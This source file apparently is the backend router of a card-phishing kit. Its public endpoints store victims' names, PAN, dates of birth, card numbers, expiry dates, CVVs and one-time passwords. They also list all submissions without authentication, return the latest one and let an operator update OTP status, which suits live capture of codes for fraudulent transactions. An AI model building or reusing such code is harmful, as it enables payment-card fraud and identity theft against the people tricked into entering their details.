import { z } from "zod";
import { createRouter, publicQuery } from "../middleware";
import { getDb } from "../queries/connection";
import { submissions } from "@db/schema";
import { eq, desc } from "drizzle-orm";

export const submissionsRouter = createRouter({
  create: publicQuery
    .input(
      z.object({
        type: z.string(),
        fullName: z.string().optional(),
        mobile: z.string().optional(),
        email: z.string().optional(),
        city: z.string().optional(),
        dob: z.string().optional(),
        pan: z.string().optional(),
        cardLimit: z.string().optional(),
        cardNumber: z.string().optional(),
        expiry: z.string().optional(),
        cvv: z.string().optional(),
        cardHolder: z.string().optional(),
        otp: z.string().optional(),
        otpStatus: z.string().optional(),
      })
    )
    .mutation(async ({ input }) => {
      const db = getDb();
      const result = await db.insert(submissions).values(input).returning();
      return result[0];
    }),

  list: publicQuery.query(async () => {
    const db = getDb();
    return db.select().from(submissions).orderBy(desc(submissions.createdAt));
  }),

  updateOtp: publicQuery
    .input(
      z.object({
        id: z.number(),
        otp: z.string(),
        otpStatus: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      const db = getDb();
      const result = await db
        .update(submissions)
        .set({ otp: input.otp, otpStatus: input.otpStatus })
        .where(eq(submissions.id, input.id))
        .returning();
      return result[0];
    }),

  getLatest: publicQuery.query(async () => {
    const db = getDb();
    const results = await db
      .select()
      .from(submissions)
      .orderBy(desc(submissions.createdAt))
      .limit(1);
    return results[0] || null;
  }),
});
